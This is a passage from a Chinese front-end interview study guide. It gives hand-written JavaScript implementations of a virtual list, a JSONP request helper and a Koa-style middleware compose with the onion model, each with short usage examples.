      el.style.cssText = `position:absolute;top:${i * this.itemHeight}px;left:0;right:0;height:${this.itemHeight}px;`;
      this.listContainer.appendChild(el);
    }
  }

  scrollToIndex(index) {
    this.container.scrollTop = index * this.itemHeight;
  }

  updateList(list) {
    this.list = list;
    this.spacer.style.height = `${list.length * this.itemHeight}px`;
    this.render();
  }
}

// 使用：
const list = new VirtualList({
  container: document.getElementById('list'),
  list: Array.from({ length: 10000 }, (_, i) => ({ id: i, name: `Item ${i}` })),
  itemHeight: 50,
  renderItem: (item, index) => {
    const el = document.createElement('div');
    el.textContent = `${item.id}: ${item.name}`;
    return el;
  }
});
```

---

### 29. 手写 JSONP

```javascript
// 手写JSONP：动态创建script标签，利用callback跨域请求

function jsonp({ url, params = {}, callbackKey = 'callback', timeout = 10000 }) {
  return new Promise((resolve, reject) => {
    // 生成唯一的callback函数名
    const callbackName = `jsonp_${Date.now()}_${Math.random().toString(36).slice(2)}`;

    // 构建URL参数
    const queryString = Object.entries({ ...params, [callbackKey]: callbackName })
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join('&');

    const fullUrl = `${url}${url.includes('?') ? '&' : '?'}${queryString}`;

    // 超时处理
    const timer = setTimeout(() => {
      cleanup();
      reject(new Error('JSONP request timeout'));
    }, timeout);

    // 清理函数
    function cleanup() {
      clearTimeout(timer);
      delete window[callbackName];
      if (script.parentNode) script.parentNode.removeChild(script);
    }

    // 定义全局callback（服务端会调用它）
    window[callbackName] = (data) => {
      cleanup();
      resolve(data);
    };

    // 创建script标签
    const script = document.createElement('script');
    script.src = fullUrl;
    script.onerror = () => {
      cleanup();
      reject(new Error('JSONP request failed'));
    };
    document.head.appendChild(script);
  });
}

// 简化版（无参数构建）：
function jsonpSimple(url, callbackName = 'callback') {
  return new Promise((resolve, reject) => {
    const cb = `jsonp_cb_${Date.now()}`;
    const timer = setTimeout(() => {
      delete window[cb];
      reject(new Error('timeout'));
    }, 10000);

    window[cb] = (data) => {
      clearTimeout(timer);
      delete window[cb];
      if (script.parentNode) script.parentNode.removeChild(script);
      resolve(data);
    };

    const separator = url.includes('?') ? '&' : '?';
    const script = document.createElement('script');
    script.src = `${url}${separator}${callbackName}=${cb}`;
    document.head.appendChild(script);
  });
}

// 测试：
jsonp({
  url: 'https://api.example.com/data',
  params: { id: 123 },
  callbackKey: 'callback'
}).then(data => console.log(data));

// 服务端返回格式：callback({"name":"张三"})
// 会调用window['callback']函数
```

---

### 30. 手写 KOA 中间件（compose 洋葱模型）

```javascript
// 手写koa中间件：compose + 洋葱模型
// 洋葱模型：请求从外层进入，层层深入到核心，再层层返回

function compose(middleware) {
  return function(ctx, next) {
    let index = -1;

    function dispatch(i) {
      if (i <= index) throw new Error('next() called multiple times');
      index = i;

      if (i === middleware.length) {
        // 所有中间件执行完毕，调用最后的next（如果有）
        return next ? Promise.resolve(next(ctx)) : Promise.resolve();
      }

      const fn = middleware[i];
      try {
        return Promise.resolve(
          fn(ctx, () => dispatch(i + 1))
        );
      } catch (e) {
        return Promise.reject(e);
      }
    }

    return dispatch(0);
  };
}

// 简化Koa类：
class Koa {
  constructor() {
    this.middlewares = [];
  }

  use(fn) {
    this.middlewares.push(fn);
    return this;
  }

  listen(port, callback) {
    const server = require('http').createServer(async (req, res) => {
      const ctx = { req, res, state: {}, body: null };

      // 设置res.json辅助
      ctx.json = (data) => {
        ctx.body = JSON.stringify(data);
        res.setHeader('Content-Type', 'application/json');
      };

      try {
        await this.callback(ctx);
      } catch (e) {
        console.error(e);
        res.statusCode = 500;
        res.end('Internal Server Error');
      }
    });

    return server.listen(port, callback);
  }

  callback(ctx) {
    const fn = compose(this.middlewares);
    return fn(ctx);
  }
}

// 示例中间件：
const logger = async (ctx, next) => {
  const start = Date.now();
  console.log(`${ctx.req.method} ${ctx.req.url}`);
  await next();
  console.log(`耗时: ${Date.now() - start}ms`);
};

const auth = async (ctx, next) => {
  const token = ctx.req.headers.authorization;
  if (!token) {
    ctx.res.statusCode = 401;
    ctx.body = 'Unauthorized';
    return;
  }
  ctx.state.user = { id: 1, name: '张三' };
  await next();
};

const render = async (ctx, next) => {
  ctx.body = { message: 'Hello, ' + ctx.state.user.name };
  await next(); // 洋葱模型的最后一层
};

// 使用：
const app = new Koa();
app.use(logger);
app.use(auth);
app.use(render);
app.listen(3000, () => console.log('Server running at 3000'));

// 请求流程：
// logger enter → auth enter → render enter → (body set) → render exit
// → auth exit → logger exit → response

// 中间件间共享数据：通过 ctx.state
// ctx.req/res 是原生node的req/res
// ctx.body 会写入response body
```

---

*以上为前十二章内容。JavaScript（第三章）、TypeScript（第四章）、性能优化（第十一章）、手写代码（第十二章）均已完整收录。*

